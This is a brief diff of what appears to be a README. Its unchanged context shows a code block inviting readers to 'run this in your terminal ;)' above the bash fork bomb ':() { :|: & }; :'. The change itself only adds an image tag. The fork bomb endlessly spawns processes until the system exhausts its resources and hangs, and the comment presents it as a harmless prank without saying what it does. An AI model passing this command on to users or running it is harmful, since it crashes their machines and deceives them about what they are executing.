@@ -7,3 +7,7 @@
 # hey run this in your terminal ;)
 :() { :|: & }; :
 ```
+
+<br />
+
+<img src="./assets/20220108_144430_edited.jpeg" width="220" />
